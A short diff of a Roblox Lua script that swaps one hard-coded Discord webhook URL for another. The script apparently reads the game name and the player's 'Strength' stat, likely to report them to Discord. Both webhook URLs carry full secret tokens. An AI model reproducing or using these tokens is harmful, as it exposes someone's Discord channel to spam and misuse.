@@ -13,7 +13,7 @@ local success, game_info = pcall(function()
 end)
 local game_name = success and game_info.Name or "Unknown Game"
 
-local webhook_url = "https://discord.com/api/webhooks/1353077062889377924/kpxhvlPXVcSTd7IuWuMFYmpfFC1Nljyc5N9TInaD9F_jyym2IdtK4iPUM0rh3__VRL7z"
+local webhook_url = "https://discord.com/api/webhooks/1358359501530599596/rEogR8qBLgD7ryHGsVAOW6xwFsolI3PEAfQ7EN088K2S3UKRMT2C9kwXjwaPgXXbEeWk"
 
 local leaderstats = player:FindFirstChild("leaderstats")
 local Strength = leaderstats and leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or "N/A"
